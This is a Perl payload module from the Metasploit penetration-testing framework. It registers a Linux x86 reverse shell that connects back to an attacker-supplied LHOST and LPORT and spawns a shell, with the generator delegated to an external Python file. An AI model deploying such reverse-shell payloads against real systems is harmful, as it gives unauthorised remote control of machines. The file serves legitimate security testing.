package Msf::Payload::linx86_reverse_ie;
use strict;
use base 'Msf::ExternalPayload';

my $info =
{
    Name         => 'linx86reverse_ie',
    Version      => '1.0',
    Description  => 'Connect back to attacker and spawn a shell',
    Author       => 'gera[at]corest.com [InlineEgg License]',
    Arch         => [ 'x86' ],
    Priv         => 0,
    OS           => [ 'linux' ],
    Keys         => '', 
    Multistage   => 0,
    Type         => 'reverse_shell',
    Size         => '',
    UserOpts     =>
        {
            'LHOST' => [1, 'ADDR', 'Local address to receive connection'],
            'LPORT' => [1, 'PORT', 'Local port to receive connection'],
        }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info, 'Filename' => 'external/linx86reverse_ie.py'}, @_);
    $self->{'Info'}->{'Size'} = $self->_GenSize;
    return($self);
}

sub _GenSize
{
    my $self = shift;
    my $bin = $self->Generate({LHOST => '127.0.0.1', 'LPORT' => '4444',});
    return length($bin);
}
